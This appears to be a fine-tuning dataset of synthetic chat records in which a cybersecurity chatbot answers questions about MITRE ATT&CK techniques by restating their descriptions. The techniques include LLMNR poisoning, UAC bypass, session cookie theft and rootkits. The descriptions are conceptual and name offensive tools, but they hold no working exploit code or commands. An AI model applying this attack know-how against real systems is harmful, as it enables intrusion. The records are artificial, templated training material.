{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'External Defacement' and with the Id: T1491.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'External Defacement' and with the Id: T1491.002 is described as follows: An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Encrypted/Encoded File' and with the Id: T1027.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Encrypted/Encoded File' and with the Id: T1027.013 is described as follows: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLMNR/NBT-NS Poisoning and Relay' and with the Id: T1171 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLMNR/NBT-NS Poisoning and Relay' and with the Id: T1171 is described as follows: Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'IP Addresses' and with the Id: T1590.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'IP Addresses' and with the Id: T1590.005 is described as follows: Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'OS Exhaustion Flood' and with the Id: T1499.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'OS Exhaustion Flood' and with the Id: T1499.001 is described as follows: Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rootkit' and with the Id: T1014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rootkit' and with the Id: T1014 is described as follows: Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'PowerShell Profile' and with the Id: T1546.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'PowerShell Profile' and with the Id: T1546.013 is described as follows: Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'JavaScript' and with the Id: T1059.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'JavaScript' and with the Id: T1059.007 is described as follows: Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS' and with the Id: T1590.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS' and with the Id: T1590.002 is described as follows: Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Systemd Service' and with the Id: T1501 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Systemd Service' and with the Id: T1501 is described as follows: Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands. * ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. * ExecReload directive covers when a service restarts. * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016). The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Elevated Execution with Prompt' and with the Id: T1514 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Elevated Execution with Prompt' and with the Id: T1514 is described as follows: Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Audio Capture' and with the Id: T1123 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Audio Capture' and with the Id: T1123 is described as follows: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create or Modify System Process' and with the Id: T1543 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create or Modify System Process' and with the Id: T1543 is described as follows: Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  . The systems targeted by this attack pattern are: Windows, macOS, Linux, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'External Remote Services' and with the Id: T1133 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'External Remote Services' and with the Id: T1133 is described as follows: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware). The systems targeted by this attack pattern are: Windows, Linux, Containers, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Firmware' and with the Id: T1109 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Firmware' and with the Id: T1109 is described as follows: Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LC_LOAD_DYLIB Addition' and with the Id: T1546.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LC_LOAD_DYLIB Addition' and with the Id: T1546.006 is described as follows: Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.(Citation: Malware Persistence on OS X). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steal Web Session Cookie' and with the Id: T1539 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steal Web Session Cookie' and with the Id: T1539 is described as follows: An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Container Orchestration Job' and with the Id: T1053.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Container Orchestration Job' and with the Id: T1053.007 is described as follows: Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes). The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Generation Algorithms' and with the Id: T1568.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Generation Algorithms' and with the Id: T1568.002 is described as follows: Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)DGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Double File Extension' and with the Id: T1036.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Double File Extension' and with the Id: T1036.007 is described as follows: Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bypass User Account Control' and with the Id: T1548.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bypass User Account Control' and with the Id: T1548.002 is described as follows: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Timestomp' and with the Id: T1099 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Timestomp' and with the Id: T1099 is described as follows: Adversaries may take actions to hide the deployment of new, or modification of existing files to obfuscate their activities. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internet Connection Discovery' and with the Id: T1016.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internet Connection Discovery' and with the Id: T1016.001 is described as follows: Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.. The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
